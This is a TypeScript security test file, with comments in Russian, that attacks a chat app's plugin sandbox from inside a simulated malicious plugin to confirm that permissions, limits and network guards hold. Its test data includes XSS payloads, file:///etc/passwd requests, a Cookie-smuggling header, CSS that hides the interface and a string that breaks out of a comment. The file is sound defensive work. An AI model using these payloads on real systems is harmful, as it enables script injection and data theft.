// v1.345.0: попытки сломать приложение изнутри плагина.
//
// Это не проверка «работает ли хорошее» — это проверка «выдерживает ли плохое».
// Плагин ставит человек, доверяя описанию; вредный или просто кривой плагин не
// должен уметь испортить приложение так, чтобы человек не смог его выключить.
//
// Атаки идут через НАСТОЯЩИЙ createDispatcher из api.ts — тот самый, который
// обслуживает живую песочницу. Заглушки только там, где нужен браузер.
//
// Запуск: npm run test:attack
export {}

const store = new Map<string, string>()
;(globalThis as any).localStorage = {
  getItem: (k: string) => (store.has(k) ? store.get(k)! : null),
  setItem: (k: string, v: string) => { store.set(k, String(v)) },
  removeItem: (k: string) => { store.delete(k) },
  clear: () => store.clear(),
}
;(globalThis as any).window = { addEventListener: () => {}, removeEventListener: () => {}, dispatchEvent: () => true }
;(globalThis as any).document = {
  head: { appendChild: () => {} }, body: { appendChild: () => {} },
  createElement: () => ({ style: {}, dataset: {}, setAttribute: () => {}, remove: () => {}, textContent: '' }),
  getElementById: () => null, querySelector: () => null,
}
;(globalThis as any).location = { hostname: 'ponoi.app' }
;(globalThis as any).fetch = async () => ({ ok: true, status: 200, text: async () => 'ok' })

const { createDispatcher, PLUGIN_METHODS } = await import('./api')
const { NET_HEADERS } = await import('./netGuard')
// v1.446.0: пределы подняты, и числа в штурме больше НЕ пишутся руками —
// они берутся оттуда же, откуда их берёт приложение. Иначе проверка
// стережёт вчерашние числа, а не сегодняшнее правило.
const { LIMITS, MAX_PER_PLUGIN, MAX_RECENT, MAX_CSS, MAX_STORAGE_VALUE } = await import('./limits')
const { readFileSync } = await import('node:fs')
const registry = await import('./registry')
const { upsertPlugin, loadPlugins } = await import('./store')
const { ALL_PERMISSIONS, PLUGIN_EVENTS } = await import('./types')

let pass = 0, fail = 0
const ok = (n: string) => { pass++; console.log('OK   ' + n) }
const bad = (n: string, why?: string) => { fail++; console.log('ПРОБИЛ ' + n + (why ? ' — ' + why : '')) }
async function check(name: string, fn: () => boolean | Promise<boolean>) {
  try { const r = await fn(); if (r === false) bad(name); else ok(name) }
  catch (e: any) { bad(name, e?.message ?? String(e)) }
}
/** Атака должна быть отбита — то есть вызвать отказ. */
async function blocked(name: string, fn: () => Promise<unknown>) {
  try { await fn(); bad(name, 'прошло, хотя должно быть отвергнуто') }
  catch { ok(name) }
}

/** Действие, наоборот, должно пройти: иначе проверка «всё запрещено» ничего не значит. */
async function allowed(name: string, fn: () => Promise<unknown>) {
  try { await fn(); ok(name) }
  catch (e: any) { bad(name, 'отвергнуто, хотя должно проходить: ' + (e?.message ?? e)) }
}

const sent: string[] = []
const toasts: string[] = []

function attacker(perms: string[] = [...ALL_PERMISSIONS], id = 'evil') {
  const plugin: any = {
    manifest: { id, name: 'Вредный', version: '1.0.0', author: 'кто-то', description: '', permissions: perms, hosts: ['evil.example'] },
    code: '', enabled: true, installedAt: '', sourceUserId: null, storage: {},
  }
  upsertPlugin(plugin)
  return createDispatcher(plugin, {
    sendMessage: async (t: string) => { sent.push(t) },
    toast: (t: string) => { toasts.push(t) },
  }, () => {})
}

const fn = { __fn: 'f1' } as any

console.log('── Разрешения ──')
{
  // Плагин без прав не должен уметь ничего из того, что их требует.
  const d = attacker([], 'no-perms')
  await blocked('без права нельзя отправить сообщение', () => d('messages.send', ['спам']))
  await blocked('без права нельзя добавить кнопку', () => d('ui.addComposerButton', [{ key: 'k', tooltip: 't', onClick: fn }]))
  await blocked('без права нельзя поставить css', () => d('css', ['body{display:none}']))
  await blocked('без права нельзя ходить в сеть', () => d('net.fetch', ['https://evil.example/x']))
  await blocked('без права нельзя читать сообщения', () => d('subscribe', ['message']))
  await blocked('без права нет уведомлений', () => d('notify', ['бум']))
  await blocked('без права нет хранилища', () => d('storage.set', ['k', 'v']))
  await blocked('несуществующий метод отвергается', () => d('внутренности.дай', []))
}

console.log('\n── Панель в приложении и музыка (v1.417.0) ──')
{
  const none = attacker([], 'no-perms-new')
  await blocked('без права нельзя поставить панель', () =>
    none('ui.addPanel', [{ slot: 'player', title: 'Т', rows: [] }]))
  await blocked('без права нельзя узнать, что играет', () => none('music.now', []))
  await blocked('без права нельзя увидеть Трекотеку', () => none('music.library', []))
  await blocked('без права нельзя нажать паузу', () => none('music.pause', []))
  await blocked('без права нельзя добавить трек', () => none('music.add', ['https://example.com/a.mp3']))

  const all = attacker([...ALL_PERMISSIONS], 'all-perms-new')
  await blocked('панель в выдуманном месте не ставится', () =>
    all('ui.addPanel', [{ slot: 'везде', title: 'Т', rows: [] }]))
  await blocked('панель без места не ставится', () => all('ui.addPanel', [{ title: 'Т', rows: [] }]))
  await allowed('панель в известном месте ставится', () =>
    all('ui.addPanel', [{ slot: 'player', title: 'Мой уголок', rows: [] }]))

  await check('в панель попадают только известные строки', async () => {
    // Всё лишнее пересобирается поштучно, а не пропускается как есть: строка с
    // чужим типом — это попытка нарисовать в окне что-то своё.
    await all('ui.addPanel', [{ slot: 'library', title: 'Т', rows: [
      { type: 'toggle', key: 'a', label: 'Норм', value: true },
      { type: 'html', key: 'b', label: '<img src=x onerror=alert(1)>' },
      { type: 'button', key: 'c', label: 'Кнопка' },
    ] }] )
    const reg2 = await import('./registry')
    const panel = reg2.getRegistry().panels.find((x: any) => x.slot === 'library')
    // Осталась одна строка: у 'html' нет такого вида, у кнопки нет обработчика.
    return !!panel && panel.rows.length === 1 && panel.rows[0].type === 'toggle'
  })

  await check('одно место — не больше трёх панелей', async () => {
    const a1 = attacker([...ALL_PERMISSIONS], 'p1')
    const a2 = attacker([...ALL_PERMISSIONS], 'p2')
    const a3 = attacker([...ALL_PERMISSIONS], 'p3')
    const a4 = attacker([...ALL_PERMISSIONS], 'p4')
    for (const [i, d] of [a1, a2, a3].entries()) {
      await d('ui.addPanel', [{ slot: 'sidebar', title: 'П' + i, rows: [] }])
    }
    try { await a4('ui.addPanel', [{ slot: 'sidebar', title: 'П4', rows: [] }]); return false }
    catch { return true }
  })

  await check('чужую панель своим id не подменить', async () => {
    const мой = attacker([...ALL_PERMISSIONS], 'мой')
    const чужой = attacker([...ALL_PERMISSIONS], 'чужой')
    await мой('ui.addPanel', [{ slot: 'player', title: 'Моя', rows: [] }])
    await чужой('ui.addPanel', [{ slot: 'player', title: 'Чужая', rows: [] }])
    const reg2 = await import('./registry')
    const мои = reg2.getRegistry().panels.filter((x: any) => x.pluginId === 'мой' && x.slot === 'player')
    return мои.length === 1 && мои[0].title === 'Моя'
  })
}

console.log('\n── Новые возможности (v1.419.0) ──')
{
  // Каждая новая возможность — новый способ навредить, если она даётся без
  // спроса. Проверяем ровно это: без разрешения ничего из добавленного не
  // работает, а с разрешением — работает (иначе проверка ничего не значит).
  const none = attacker([], 'no-perms-419')
  await blocked('без права нельзя поставить горячую клавишу', () =>
    none('ui.addHotkey', [{ combo: 'Ctrl+Shift+K', description: 'зло', onPress: fn }]))
  await blocked('без права нельзя прочитать переписку', () => none('messages.recent', [20]))
  await blocked('без права нельзя поставить реакцию', () => none('messages.react', ['m1', '👍']))
  await blocked('без права нельзя удалить сообщение', () => none('messages.remove', ['m1']))
  await blocked('без права нельзя увидеть список серверов', () => none('servers', []))
  await blocked('без права нельзя увидеть каналы', () => none('channels', ['s1']))
  await blocked('без права нельзя увести человека в другой канал', () => none('open', [{ serverId: 's1' }]))
  await blocked('без права нельзя менять активность', () => none('status.set', ['я тут']))
  await blocked('без права нельзя узнать активность', () => none('status.get', []))
  await blocked('без права нет звука', () => none('sound.play', ['message']))
  await blocked('без права нельзя вычистить хранилище', () => none('storage.clear', []))

  const all = attacker([...ALL_PERMISSIONS], 'all-perms-419')
  // Горячие клавиши: голая буква и одиночный Ctrl отняли бы у человека набор
  // текста и привычные сочетания приложения — причём молча.
  for (const combo of ['K', 'Ctrl+K', 'Shift+A', 'Ctrl', '', 'Ctrl+Shift']) {
    await blocked(`сочетание «${combo || 'пусто'}» не принимается`, () =>
      all('ui.addHotkey', [{ combo, description: 'з', onPress: fn }]))
  }
  await allowed('нормальное сочетание принимается', () =>
    all('ui.addHotkey', [{ combo: 'Ctrl+Shift+K', description: 'проба', onPress: fn }]))
  await check('чужое сочетание не перехватить', async () => {
    const b = attacker([...ALL_PERMISSIONS], 'hk-thief')
    try { await b('ui.addHotkey', [{ combo: 'Ctrl+Shift+K', description: 'подмена', onPress: fn }]); return false }
    catch { return true }
  })
  await check('горячих клавиш не больше положенного на плагин', async () => {
    const d = attacker([...ALL_PERMISSIONS], 'hk-flood')
    let added = 0
    // Пробуем на десяток больше, чем позволено: сколько бы ни был предел,
    // перешагнуть его нельзя.
    for (let i = 0; i < MAX_PER_PLUGIN.hotkeys + 10; i++) {
      const c = 'Ctrl+Alt+' + String.fromCharCode(65 + (i % 26)) + (i < 26 ? '' : i)
      try { await d('ui.addHotkey', [{ combo: c, description: 'x', onPress: fn }]); added++ } catch { /* предел */ }
    }
    return added <= MAX_PER_PLUGIN.hotkeys
  })

  // Панель в чате — новое место; выдуманное по-прежнему не проходит.
  await allowed('панель в чате ставится', () =>
    all('ui.addPanel', [{ slot: 'chat', title: 'Уголок', rows: [] }]))

  await check('в панель не проходит картинка с чужим протоколом', async () => {
    await all('ui.addPanel', [{ slot: 'chat', title: 'Т', rows: [
      { type: 'image', key: 'bad', label: 'зло', value: 'javascript:alert(1)' },
      { type: 'image', key: 'bad2', label: 'зло', value: 'data:image/svg+xml,<svg onload=alert(1)>' },
      { type: 'image', key: 'ok', label: 'норм', value: 'https://example.com/i.png' },
    ] }])
    const panel = registry.getRegistry().panels.find((x: any) => x.slot === 'chat' && x.pluginId === 'all-perms-419')
    return !!panel && panel.rows.length === 1 && panel.rows[0].type === 'image'
  })

  await check('числа в строках приводятся к своим границам', async () => {
    await all('ui.addPanel', [{ slot: 'library', title: 'Ч', rows: [
      { type: 'progress', key: 'p', label: 'п', value: 1e9 },
      { type: 'progress', key: 'p2', label: 'п2', value: NaN },
      { type: 'slider', key: 's', label: 'с', value: 999, min: 0, max: 10, step: 1 },
    ] }])
    const panel = registry.getRegistry().panels.find((x: any) => x.slot === 'library' && x.pluginId === 'all-perms-419')
    if (!panel) return false
    const p = panel.rows.find((r: any) => r.key === 'p') as any
    const p2 = panel.rows.find((r: any) => r.key === 'p2') as any
    const s = panel.rows.find((r: any) => r.key === 's') as any
    return p.value === 100 && p2.value === 0 && s.value === 10
  })

  await check('ползунок с перевёрнутыми границами отбрасывается', async () => {
    // Своё же место (chat): панель этого плагина заменяется его новой, а не
    // считается четвёртой в углу.
    await all('ui.addPanel', [{ slot: 'chat', title: 'Г', rows: [
      { type: 'slider', key: 'bad', label: 'плохо', value: 5, min: 10, max: 1, step: 1 },
    ] }])
    const panel = registry.getRegistry().panels.find((x: any) => x.slot === 'chat' && x.pluginId === 'all-perms-419')
    return !!panel && panel.rows.length === 0
  })

  // Чат: без открытого чата читать и править нечего — отказ, а не тишина.
  await blocked('без открытого чата нечего читать', () => all('messages.recent', [10]))
  await blocked('без открытого чата некуда ставить реакцию', () => all('messages.react', ['m1', '👍']))
  await blocked('пустой переход отвергается', () => all('open', [{}]))
  await blocked('выдуманный звук не играет', () => all('sound.play', ['сирена']))
}

console.log('\n── Открытый чат: что можно и чего нельзя (v1.419.0) ──')
{
  // Мост регистрирует сам экран чата под id открытого разговора. Проверяем не
  // отказы, а работу: чтение отдаёт то, что на экране, реакция проходит, чужое
  // сообщение не удаляется, а чат, который сейчас не открыт, плагину недоступен
  // вовсе — иначе «читаю открытый чат» означало бы «читаю любой».
  const { setChatBridge } = await import('./chatApi')
  const реакции: string[] = []
  const удалено: string[] = []
  const открытый = {
    recent: (n: number) => [
      { id: 'm1', author: 'я', authorName: 'Я', content: 'привет', mine: true, at: '2026-07-29T10:00:00Z' },
      { id: 'm2', author: 'он', authorName: 'Он', content: 'о/', mine: false, at: '2026-07-29T10:01:00Z' },
    ].slice(-n),
    react: async (id: string, e: string) => { реакции.push(id + e); return null },
    remove: async (id: string) => {
      if (id !== 'm1') return 'Плагин может убрать только твоё сообщение.'
      удалено.push(id); return null
    },
  }
  setChatBridge('chat-open', открытый)
  setChatBridge('chat-hidden', {
    recent: () => [{ id: 'x', author: 'кто-то', authorName: 'Кто-то', content: 'тайна', mine: false, at: '' }],
    react: async () => null, remove: async () => null,
  })

  const plugin: any = {
    manifest: { id: 'chat-plug', name: 'Чат', version: '1.0.0', author: 'к', description: '', permissions: [...ALL_PERMISSIONS], hosts: [] },
    code: '', enabled: true, installedAt: '', sourceUserId: null, storage: {},
  }
  upsertPlugin(plugin)
  const d = createDispatcher(plugin, {
    sendMessage: async () => {}, toast: () => {},
    // Открыт именно chat-open — про chat-hidden плагин знать не должен.
    channel: () => ({ id: 'chat-open', name: 'общий', serverId: 's1', serverName: 'С' }),
  } as any, () => {})

  await check('плагин читает открытый чат', async () => {
    const got = await d('messages.recent', [10]) as any[]
    return Array.isArray(got) && got.length === 2 && got[0].id === 'm1' && got[1].mine === false
  })
  await check('больше положенного сообщений за раз не выдаётся', async () => {
    let asked = 0
    setChatBridge('chat-open', {
      recent: (n: number) => { asked = n; return [] },
      react: async () => null, remove: async () => null,
    })
    await d('messages.recent', [100000])
    // Вернуть настоящий мост обязательно: иначе проверки ниже спрашивали бы
    // эту заглушку и «прошли» бы, ничего не проверив.
    setChatBridge('chat-open', открытый)
    return asked <= MAX_RECENT
  })
  await check('чужой чат недоступен, даже зная его id', async () => {
    // Никакого способа назвать другой чат у плагина нет: адресат берётся из
    // того, что открыто, а не из его аргументов.
    const got = await d('messages.recent', [10]) as any[]
    return Array.isArray(got) && !got.some(m => m.content === 'тайна')
  })
  await allowed('реакция в открытом чате проходит', () => d('messages.react', ['m1', '👍']))
  await blocked('чужое сообщение плагин не удалит', () => d('messages.remove', ['m2']))
  await check('своё сообщение удаляется', async () => {
    await d('messages.remove', ['m1'])
    return удалено.includes('m1')
  })
  setChatBridge('chat-open', null)
  setChatBridge('chat-hidden', null)
  await blocked('закрылся чат — читать снова нечего', () => d('messages.recent', [10]))
}

console.log('\n── Сеть: чего по-прежнему нельзя (v1.419.0) ──')
{
  // Методов стало больше, заголовков тоже — тем важнее, что домен, протокол и
  // свой же сервер остались закрытыми, а Cookie так и не проходит.
  const d = attacker([...ALL_PERMISSIONS], 'net-419')
  await blocked('чужой метод по-прежнему не пустят', () =>
    d('net.fetch', ['https://evil.example/x', { method: 'TRACE' }]))
  await check('Cookie не уходит с запросом', async () => {
    let seen: any = null
    const real = (globalThis as any).fetch
    ;(globalThis as any).fetch = async (_u: string, init: any) => { seen = init; return { ok: true, status: 200, text: async () => 'ok' } }
    await d('net.fetch', ['https://evil.example/x', { headers: { Cookie: 'sb-token=…', Authorization: 'Bearer мой' } }])
    ;(globalThis as any).fetch = real
    const keys = Object.keys(seen?.headers ?? {}).map(k => k.toLowerCase())
    // Authorization теперь можно (свой ключ плагина), Cookie — нет, и куки
    // самого приложения не подставляются: credentials omit.
    return !keys.includes('cookie') && keys.includes('authorization') && seen.credentials === 'omit'
  })
}

console.log('\n── События ──')
{
  // v1.397.0: событий стало семь вместо одного. Опасность ровно в том, что новое
  // событие легко завести мимо разрешения — тогда «плагин без прав» тихо начнёт
  // получать переписку. Поэтому проверяется КАЖДОЕ событие из таблицы, а не
  // список, переписанный сюда руками: допишут восьмое — оно проверится само.
  const none = attacker([], 'no-perms-ev')
  for (const [name, spec] of Object.entries(PLUGIN_EVENTS)) {
    if (!spec.permission) continue
    await blocked(`без права нельзя подписаться на «${name}»`, () => none('subscribe', [name]))
  }

  const all = attacker([...ALL_PERMISSIONS], 'all-perms-ev')
  for (const name of Object.keys(PLUGIN_EVENTS)) {
    await allowed(`с правами подписка на «${name}» проходит`, () => all('subscribe', [name]))
  }

  await blocked('на выдуманное событие подписаться нельзя', () => all('subscribe', ['всё.подряд']))
  await blocked('пустое имя события тоже не проходит', () => all('subscribe', ['']))

  // Разрешение у события должно быть то самое, а не «любое из выданных»: с одним
  // лишь context нельзя подписаться на сообщения.
  const ctxOnly = attacker(['context'], 'ctx-only')
  await blocked('context не открывает сообщения', () => ctxOnly('subscribe', ['message']))
  await allowed('context открывает смену канала', () => ctxOnly('subscribe', ['channel']))
}

console.log('\n── Сеть ──')
{
  const d = attacker()
  await blocked('чужой домен не пустят', () => d('net.fetch', ['https://not-declared.example/x']))
  await blocked('к самому приложению ходить нельзя', () => d('net.fetch', ['https://ponoi.app/api']))
  await blocked('http без шифрования не пустят', () => d('net.fetch', ['http://evil.example/x']))
  await blocked('file:// не пустят', () => d('net.fetch', ['file:///etc/passwd']))
  // v1.419.0: DELETE и PUT теперь разрешены (обычные методы чужих API), а вот
  // всё остальное — по-прежнему нет.
  await blocked('чужой метод не пустят', () => d('net.fetch', ['https://evil.example/x', { method: 'CONNECT' }]))

  // v1.445.0: поток (ponoi.net.stream) — второй способ выйти в сеть, появившийся
  // ради своих ИИ-моделей. Он ОБЯЗАН упираться ровно в те же запреты: правила
  // вынесены в netGuard.ts и зовутся обоими, но проверять это надо тем же
  // штурмом, а не верой в общий файл. Если однажды поток заведёт свою копию
  // проверок — упадёт здесь.
  await blocked('поток: чужой домен не пустят', () => d('net.stream', ['https://not-declared.example/x', {}, fn]))
  await blocked('поток: к самому приложению ходить нельзя', () => d('net.stream', ['https://ponoi.app/api', {}, fn]))
  await blocked('поток: http без шифрования не пустят', () => d('net.stream', ['http://evil.example/x', {}, fn]))
  await blocked('поток: file:// не пустят', () => d('net.stream', ['file:///etc/passwd', {}, fn]))
  await blocked('поток: чужой метод не пустят', () => d('net.stream', ['https://evil.example/x', { method: 'CONNECT' }, fn]))
  await blocked('поток: без обработчика не открыть', () => d('net.stream', ['https://evil.example/x', {}, 'не функция']))

  // Разрешения проверяются до всего остального: без net поток не открыть, каким
  // бы правильным ни был адрес.
  {
    const без = attacker(['ui'])
    await blocked('поток: без права net не открыть', () => без('net.stream', ['https://evil.example/x', {}, fn]))
  }

  // Заголовки у потока — тот же белый список. Cookie не должен пройти нигде.
  await blocked('поток: Cookie не подставить', async () => {
    // Дойти до сети в стенде нельзя, поэтому проверяем сам список: он один на
    // оба способа, и Cookie в нём нет.
    if (NET_HEADERS.some(h => h.toLowerCase() === 'cookie')) return 'Cookie в белом списке'
    throw new Error('Cookie не проходит')
  })
}

console.log('\n── Наводнение интерфейса ──')
{
  const d = attacker()
  const before = registry.getRegistry().composerButtons.length
  let err = ''
  try { for (let i = 0; i < 5000; i++) await d('ui.addComposerButton', [{ key: 'k' + i, tooltip: 'x', onClick: fn }]) }
  catch (e: any) { err = String(e?.message ?? e) }
  const added = registry.getRegistry().composerButtons.length - before
  await check(`кнопок композера не больше разумного (добавлено ${added}${err ? ', отказ: ' + err.slice(0, 40) : ''})`,
    () => added <= MAX_PER_PLUGIN.buttons)
}
{
  const d = attacker([...ALL_PERMISSIONS], 'evil2')
  let err = ''
  const before = registry.getRegistry().commands.length
  try { for (let i = 0; i < 3000; i++) await d('commands.register', ['ко' + i, 'опис', fn]) }
  catch (e: any) { err = String(e?.message ?? e) }
  const added = registry.getRegistry().commands.length - before
  await check(`команд не больше разумного (добавлено ${added}${err ? ', отказ: ' + err.slice(0, 40) : ''})`,
    () => added <= MAX_PER_PLUGIN.commands)
}
{
  const d = attacker([...ALL_PERMISSIONS], 'evil3')
  let err = ''
  const before = registry.getRegistry().messageActions.length
  try { for (let i = 0; i < 3000; i++) await d('ui.addMessageAction', [{ key: 'a' + i, label: 'x', onClick: fn }]) }
  catch (e: any) { err = String(e?.message ?? e) }
  const added = registry.getRegistry().messageActions.length - before
  await check(`действий над сообщением не больше разумного (добавлено ${added})`, () => added <= MAX_PER_PLUGIN.actions)
}

console.log('\n── Наводнение чатом и уведомлениями ──')
{
  const d = attacker([...ALL_PERMISSIONS], 'evil4')
  sent.length = 0
  let err = ''
  // Пробуем вдвое больше, чем позволено: предел подняли, но он есть.
  try { for (let i = 0; i < LIMITS.send.times * 2; i++) await d('messages.send', ['спам ' + i]) }
  catch (e: any) { err = String(e?.message ?? e) }
  await check(`поток сообщений упирается в предел (ушло ${sent.length}${err ? ', отказ: ' + err.slice(0, 40) : ''})`,
    () => sent.length <= LIMITS.send.times)
}
{
  const d = attacker([...ALL_PERMISSIONS], 'evil5')
  toasts.length = 0
  try { for (let i = 0; i < LIMITS.notify.times * 2; i++) await d('notify', ['бум ' + i]) } catch { /* отказ — тоже защита */ }
  await check(`поток уведомлений упирается в предел (показано ${toasts.length})`, () => toasts.length <= LIMITS.notify.times)
}

console.log('\n── Оформление ──')
{
  const d = attacker([...ALL_PERMISSIONS], 'evil6')
  await blocked('гигантский css не примут', () => d('css', ['a{}'.repeat(MAX_CSS)]))
  // Накрыть приложение непрозрачным слоем и не дать до него добраться — самый
  // простой способ сделать Ponoi неработающим, при этом «легальными» средствами.
  await check('после вредного css остаётся способ его снять', async () => {
    await d('css', ['*{display:none!important}'])
    const mod = await import('./registry')
    // Аварийный режим обязан отключать оформление плагинов целиком.
    return typeof (mod as any).setPluginsDisabled === 'function'
  })
}

console.log('\n── Хранилище ──')
{
  const d = attacker([...ALL_PERMISSIONS], 'evil7')
  await blocked('огромное значение в хранилище не влезет', () => d('storage.set', ['k', 'я'.repeat(MAX_STORAGE_VALUE)]))
}

console.log('\n── Чужое ──')
{
  const a = attacker([...ALL_PERMISSIONS], 'plug-a')
  const b = attacker([...ALL_PERMISSIONS], 'plug-b')
  await a('commands.register', ['занято', 'моя', fn])
  await blocked('чужую команду не перехватить', () => b('commands.register', ['занято', 'подмена', fn]))
  await check('чужое хранилище не прочитать', async () => {
    await a('storage.set', ['секрет', 'мой'])
    const got = await b('storage.get', ['секрет'])
    return got === null
  })
}

// ── Что плагин может вообще: список зафиксирован (v1.441.0) ────────────────
// Владелец попросил убедиться, что плагин не может действовать за других людей.
// Проверка не даёт новой возможности появиться молча: любой добавленный метод
// обязан быть внесён в PLUGIN_METHODS, а значит — обдуман на предмет «а кого
// это заденет, кроме самого человека».
{
  // Читаем ИСХОДНИК, а не собранный файл: проверка бежит из dist-attack-test,
  // и относительный путь оттуда ведёт не туда, где лежит api.ts.
  const исходник = readFileSync('src/lib/plugins/api.ts', 'utf8')
  const вКоде = [...исходник.matchAll(/case '([a-zA-Z.]+)'/g)].map(m => m[1])
  const вСписке = new Set<string>(PLUGIN_METHODS as readonly string[])

  await check('каждая возможность из кода внесена в список', () => {
    const лишние = [...new Set(вКоде)].filter(m => !вСписке.has(m))
    if (лишние.length) console.log('    не в списке:', лишние.join(', '))
    return лишние.length === 0
  })
  await check('в списке нет ничего, чего нет в коде', () => {
    const набор = new Set(вКоде)
    const мёртвые = [...вСписке].filter(m => !набор.has(m))
    if (мёртвые.length) console.log('    нет в коде:', мёртвые.join(', '))
    return мёртвые.length === 0
  })
  await check('нет возможностей управлять сервером и правами', () =>
    ![...вСписке].some(m => /role|perm|ban|kick|member|server\.(set|update|create|delete)/i.test(m)))
  await check('нет возможностей писать от чужого имени или трогать чужое', () =>
    ![...вСписке].some(m => /(as|for)User|impersonat|user\.(set|update)|profile\.set/i.test(m)))
  await check('единственная общая запись — добавление трека', () => {
    // Всё остальное меняет либо сам плагин, либо то, что человек и так делает у
    // себя. Если общих записей стало больше — это надо заметить здесь.
    const общие = [...вСписке].filter(m => m === 'music.add')
    return общие.length === 1
  })
}

// ── v1.465.0: семь новых возможностей под штурмом ──────────────────────────
//
// Каждая новая возможность — это новая поверхность. Проверяем не «работает ли
// хорошее», а «не пролезает ли плохое»: чужие данные, чужие соединения, чужая
// вёрстка, чужие задачи.

console.log('\n── Разговор плагинов (ipc) ──')
{
  const { sanitizeIpc, hasFnRef, packIpc, IPC_MAX_BYTES } = await import('./ipc')

  await check('метка функции вырезается на верхнем уровне', () =>
    sanitizeIpc({ f: { __fn: 'cb1' } }) !== null && !hasFnRef(sanitizeIpc({ f: { __fn: 'cb1' } })))

  await check('метка функции вырезается на любой глубине', () => {
    // Это главная опасность обмена: доехавшая метка дала бы соседу право звать
    // ЧУЖОЙ код с ЧУЖИМИ разрешениями — плагин без сети попросил бы соседа
    // сходить в интернет за него.
    const глубоко = { a: { b: { c: [{ d: { __fn: 'cb9' } }] } } }
    return hasFnRef(глубоко) && !hasFnRef(sanitizeIpc(глубоко))
  })

  await check('сама функция тоже не проезжает', () =>
    (sanitizeIpc({ go: () => 1 }) as any).go === null)

  await check('огромное письмо не пройдёт', () => {
    try { packIpc('ev', { s: 'я'.repeat(IPC_MAX_BYTES) }); return false } catch { return true }
  })
  await check('письмо без имени события не пройдёт', () => {
    try { packIpc('', {}); return false } catch { return true }
  })

  const d = attacker([...ALL_PERMISSIONS], 'ipc-evil')
  await blocked('без права ipc письмо не отправить', () => {
    const без = attacker(['ui'], 'ipc-no')
    return без('plugins.send', ['кто-то', 'ev', {}])
  })
  await blocked('самому себе слать нельзя', () => d('plugins.send', ['ipc-evil', 'ev', {}]))
  await check('письмо несуществующему плагину не «доставляется»', async () => {
    // ipcSend в стенде не подставлен — значит, честный false, а не вид доставки.
    const r = await d('plugins.send', ['нет-такого', 'ev', {}])
    return r === false
  })
}

console.log('\n── Перехват сообщений ──')
{
  const mw = await import('./middleware')
  mw.clearAllInterceptors()

  await blocked('без права перехватчик не поставить', () => {
    const без = attacker(['messages.read', 'messages.write'], 'mw-no')
    return без('messages.onBeforeSend', [fn])
  })

  await check('упавший перехватчик не съедает сообщение', async () => {
    mw.clearAllInterceptors()
    mw.addInterceptor({ pluginId: 'падучий', kind: 'send', fn: fn as any })
    const r = await mw.runBeforeSend('привет', null, async () => { throw new Error('я сломан') })
    mw.clearAllInterceptors()
    return r.content === 'привет' && !r.cancel
  })

  await check('молчащий перехватчик не подвешивает отправку', async () => {
    mw.clearAllInterceptors()
    mw.addInterceptor({ pluginId: 'молчун', kind: 'send', fn: fn as any })
    const t0 = Date.now()
    const r = await mw.runBeforeSend('привет', null, () => new Promise(() => {}))
    mw.clearAllInterceptors()
    // Ждём не дольше своего срока и отдаём исходный текст.
    return r.content === 'привет' && !r.cancel && Date.now() - t0 < mw.BEFORE_SEND_MS + 1500
  })

  await check('мусор из перехватчика не подменяет текст', async () => {
    mw.clearAllInterceptors()
    mw.addInterceptor({ pluginId: 'мусорщик', kind: 'send', fn: fn as any })
    const r = await mw.runBeforeSend('привет', null, async () => 42 as any)
    mw.clearAllInterceptors()
    return r.content === 'привет'
  })

  await check('отмена только явная, а не «вернул undefined»', () =>
    mw.applySendResult('текст', undefined).cancel === false
    && mw.applySendResult('текст', { cancel: 'да' }).cancel === false
    && mw.applySendResult('текст', { cancel: true }).cancel === true)

  await check('показ отменить нельзя — только текст', () =>
    mw.applyRenderResult('видно', { cancel: true }) === 'видно')

  await check('перехватчик не раздувает сообщение без предела', () =>
    mw.applySendResult('a', 'я'.repeat(mw.MAX_CONTENT * 3)).content.length === mw.MAX_CONTENT)

  await check('снятый перехватчик перестаёт править показ', () => {
    mw.clearAllInterceptors()
    mw.addInterceptor({ pluginId: 'снимаемый', kind: 'render', fn: fn as any })
    const было = mw.hasInterceptors('render')
    mw.clearInterceptors('снимаемый')
    return было && !mw.hasInterceptors('render')
  })
}

console.log('\n── Соединения (WebSocket) ──')
{
  const { checkTarget } = await import('./netGuard')
  const цель = { hosts: ['evil.example'], selfHost: 'ponoi.app', supaHost: 'db.supabase.co' }
  // Список запрещённых адресов ТОТ ЖЕ, что у обычного запроса и у потока:
  // третий способ выйти в сеть обязан упираться в те же стены.
  await check('соединение: чужой домен не пустят', () =>
    checkTarget('wss://not-declared.example/s', цель, 'wss:') !== null)
  await check('соединение: к самому приложению нельзя', () =>
    checkTarget('wss://ponoi.app/s', цель, 'wss:') !== null)
  await check('соединение: к нашему серверу нельзя', () =>
    checkTarget('wss://db.supabase.co/s', цель, 'wss:') !== null)
  await check('соединение: ws без шифрования не пустят', () =>
    checkTarget('ws://evil.example/s', цель, 'wss:') !== null)
  await check('соединение: https по адресу сокета не пустят', () =>
    checkTarget('https://evil.example/s', цель, 'wss:') !== null)
  await check('объявленный домен по wss — проходит', () =>
    checkTarget('wss://evil.example/s', цель, 'wss:') === null)
  // Проверка «всё запрещено» ничего не значит без обратного случая.
  await check('обычный запрос по-прежнему требует https, а не wss', () =>
    checkTarget('wss://evil.example/s', цель) !== null && checkTarget('https://evil.example/s', цель) === null)

  await blocked('без права net соединение не открыть', () => {
    const без = attacker(['ui'], 'ws-no')
    return без('net.ws', ['wss://evil.example/s', {}])
  })

  const ws = await import('./wsHub')
  await check('в чужое соединение писать нельзя', () => {
    try { ws.sendSocket('чужой', 999999, 'привет'); return false } catch { return true }
  })
  await check('чужое соединение не закрыть', () => ws.closeSocket('чужой', 999999) === false)
}

console.log('\n── Цвета оформления ──')
{
  const { parseTheme, themeCss, THEME_VAR_NAMES } = await import('./pluginTheme')

  await check('чужая переменная не пройдёт', () => {
    try { parseTheme({ 'display': 'none' }); return false } catch { return true }
  })
  await check('выдуманное имя не пройдёт молча', () => {
    // «Применилось, но ничего не изменилось» — худший ответ из возможных.
    try { parseTheme({ 'bg-primary': '#101015' }); return false } catch { return true }
  })
  await check('не-цвет не пройдёт', () => {
    for (const v of ['red', 'url(https://чужой)', '#fff', 'rgb(0,0,0)', '#101015;}body{display:none']) {
      try { parseTheme({ accent: v }); return false } catch { /* так и надо */ }
    }
    return true
  })
  await check('именем плагина из комментария не выйти', () => {
    // Имя плагина — единственное, что попадает в текст стилей от него. Опасны
    // здесь не слова, а знаки: «*/» закрыло бы комментарий, «<» — весь тег
    // style, «{}» открыло бы своё правило. Их и проверяем.
    const css = themeCss('evil*/}</style><script>x{', { accent: '#ff4500' })
    const шапка = css.split('\n')[0]
    // Закрывающая «*/» в строке ровно одна — та, что поставили мы сами.
    const закрытий = шапка.split('*/').length - 1
